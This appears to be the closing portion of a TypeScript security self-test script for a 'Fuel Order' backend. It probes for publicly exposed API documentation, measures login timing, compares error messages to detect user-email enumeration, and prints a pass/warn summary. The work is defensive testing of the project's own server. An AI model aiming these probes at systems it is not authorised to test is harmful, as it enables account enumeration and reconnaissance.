    } catch { /* ignore */ }
    await sleep(DELAY_MS);
  }

  // Check if /api-docs or /swagger is exposed (unauthenticated API docs)
  const docsEndpoints = ['/api-docs', '/swagger', '/swagger.json', '/swagger-ui.html', '/openapi.json', '/docs', '/redoc'];
  for (const ep of docsEndpoints) {
    try {
      const { status } = await probe(ep);
      record('Leakage', `Unauthenticated API docs: ${ep}`,
        status === 404 || status === 401 || status === 403, status === 200 ? 'warn' : 'info',
        '404/401', `HTTP ${status}`,
        status === 200 ? '⚠ API schema publicly accessible — may aid attackers' : undefined);
    } catch { /* ignore */ }
    await sleep(100);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 10 — Timing & User Enumeration
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteTiming() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 10 — Timing Attacks & User Enumeration${C.reset}`);
  console.log(`${C.grey}  Checks if response time or message differs between valid/invalid emails.${C.reset}\n`);

  const SAMPLES = 4;
  const knownBadEmail   = 'definitely_does_not_exist_xyz123@notreal.invalid';
  const plausibleEmail  = 'admin@fuelorder.local';  // may or may not exist

  async function avgLatency(email: string): Promise<number> {
    let total = 0;
    for (let i = 0; i < SAMPLES; i++) {
      try {
        const { latencyMs } = await probe('/api/v1/auth/login', {
          method: 'POST',
          body: JSON.stringify({ email, password: 'WrongPassword123!' }),
        });
        total += latencyMs;
      } catch { /* ignore */ }
      await sleep(200);
    }
    return total / SAMPLES;
  }

  console.log(`  Measuring login latency for unknown vs plausible email (${SAMPLES} samples each)...`);
  const unknownMs  = await avgLatency(knownBadEmail);
  const plausibleMs = await avgLatency(plausibleEmail);
  const deltaMs = Math.abs(plausibleMs - unknownMs);

  console.log(`  ${C.grey}Unknown email avg:  ${unknownMs.toFixed(0)} ms${C.reset}`);
  console.log(`  ${C.grey}Plausible email avg: ${plausibleMs.toFixed(0)} ms${C.reset}`);
  console.log(`  ${C.grey}Delta: ${deltaMs.toFixed(0)} ms${C.reset}`);

  // > 200 ms delta is considered a notable timing difference for enumeration
  const timingLeak = deltaMs > 200;
  record('Timing', 'Login timing difference between known/unknown emails',
    !timingLeak, timingLeak ? 'warn' : 'info',
    '< 200 ms delta', `${deltaMs.toFixed(0)} ms delta`,
    timingLeak
      ? '⚠ Large timing difference — attacker can enumerate valid emails via timing'
      : 'Timing is consistent (no enumeration risk from latency)');

  // Check if error message differs between bad email and bad password
  try {
    const [r1, r2] = await Promise.all([
      probe('/api/v1/auth/login', {
        method: 'POST',
        body: JSON.stringify({ email: knownBadEmail, password: 'any' }),
      }),
      probe('/api/v1/auth/login', {
        method: 'POST',
        body: JSON.stringify({ email: 'admin@fuelorder.local', password: 'wrong-password-xyz' }),
      }),
    ]);

    let b1: any = {}, b2: any = {};
    try { b1 = JSON.parse(r1.body); } catch { /* */ }
    try { b2 = JSON.parse(r2.body); } catch { /* */ }

    const msg1 = (b1.message || b1.error || '').toLowerCase();
    const msg2 = (b2.message || b2.error || '').toLowerCase();
    const differentMessages = msg1 !== msg2 && msg1.length > 0 && msg2.length > 0;

    record('Timing', 'Login error message reveals user existence',
      !differentMessages, differentMessages ? 'warn' : 'info',
      'same message', differentMessages
        ? `⚠ Different: ["${msg1.slice(0, 40)}"] vs ["${msg2.slice(0, 40)}"]`
        : `Same message (good): "${msg1.slice(0, 50) || '(empty)'}"`);
  } catch { /* ignore */ }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUMMARY
// ═══════════════════════════════════════════════════════════════════════════════

function printSummary() {
  const total    = results.length;
  const passed   = results.filter(r => r.passed).length;
  const failed   = results.filter(r => !r.passed);
  const critical = failed.filter(r => r.severity === 'critical');
  const warnings = failed.filter(r => r.severity === 'warn');
  const info     = failed.filter(r => r.severity === 'info');

  console.log(`\n${'═'.repeat(65)}`);
  console.log(`${C.bold}ADVANCED ATTACK SIMULATION — SUMMARY${C.reset}`);
  console.log(`${'═'.repeat(65)}`);
  console.log(`  Total checks:  ${total}`);
  console.log(`  ${C.green}Passed:         ${passed}${C.reset}`);
  console.log(`  ${critical.length > 0 ? C.red : C.grey}Critical fails: ${critical.length}${C.reset}`);
  console.log(`  ${warnings.length > 0 ? C.yellow : C.grey}Warnings:       ${warnings.length}${C.reset}`);
  console.log(`  ${C.grey}Info fails:     ${info.length}${C.reset}  ${C.grey}(low-risk, expected behavior)${C.reset}`);
  console.log(`${'═'.repeat(65)}`);

  if (critical.length > 0) {
    console.log(`\n${C.bold}${C.red}🚨 CRITICAL ISSUES — Fix immediately:${C.reset}`);
    for (const r of critical) {
      console.log(`  ${C.red}✗${C.reset} [${r.suite}] ${r.name}`);
      console.log(`     expected: ${r.expected}`);
      console.log(`     actual:   ${r.actual}`);
      if (r.note) console.log(`     note:     ${r.note}`);
    }
  }

  if (warnings.length > 0) {
    console.log(`\n${C.bold}${C.yellow}⚠ WARNINGS — Review these:${C.reset}`);
    for (const r of warnings) {
      console.log(`  ${C.yellow}✗${C.reset} [${r.suite}] ${r.name}`);
      console.log(`     actual: ${r.actual}`);
      if (r.note) console.log(`     note:   ${r.note}`);
    }
  }

  if (info.length > 0) {
    console.log(`\n${C.grey}INFO-level (probably fine, but review):${C.reset}`);
    for (const r of info) {
      console.log(`  ${C.grey}· [${r.suite}] ${r.name} → ${r.actual}${C.reset}`);
    }
  }

  console.log(`\n${C.bold}${C.yellow}After running:${C.reset}`);
  console.log(`  1. Review Security Events tab — injection + CVE + JWT probes should appear.`);
  console.log(`  2. Unblock ::1 in Firewall → Blocked IPs if needed.`);
  console.log(`  3. Any CRITICAL or WARNING items need immediate code-level fixes.\n`);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  console.log(`\n${C.bold}${'═'.repeat(65)}${C.reset}`);
  console.log(`${C.bold}  FUEL ORDER — ADVANCED ATTACK SIMULATION (ROUND 2)${C.reset}`);
  console.log(`${C.bold}${'═'.repeat(65)}${C.reset}`);
  console.log(`  Target:  ${C.cyan}${BASE_URL}${C.reset}`);
  console.log(`  Started: ${new Date().toISOString()}`);

  console.log(`\n${C.grey}Checking server reachability...${C.reset}`);
  try {
    const { status } = await probe('/api/v1/health');
    console.log(`  Server responded: HTTP ${status}`);
    if (status >= 500) { console.error(`${C.red}  5xx error. Check backend logs.${C.reset}`); process.exit(1); }
  } catch (err: any) {
    console.error(`${C.red}  Cannot reach ${BASE_URL}: ${err?.message || err}${C.reset}`);
    console.error(`${C.red}  Start backend: cd backend && npm run dev${C.reset}`);
    process.exit(1);
  }

  await suiteInjection();
  await sleep(600);
  await suiteProtocol();
  await sleep(600);
  await suiteEncodedTraversal();
  await sleep(600);
  await suiteJwt();
  await sleep(600);
  await suiteCors();
  await sleep(600);
  await suiteSsrf();
  await sleep(600);
  await suiteMassAssignment();
  await sleep(600);
  await suiteCveHeaders();
  await sleep(600);
  await suiteLeakage();
  await sleep(600);
  await suiteTiming();

  printSummary();
}

main().catch(err => {
  console.error(`${C.red}Unhandled error:${C.reset}`, err);
  process.exit(1);
});
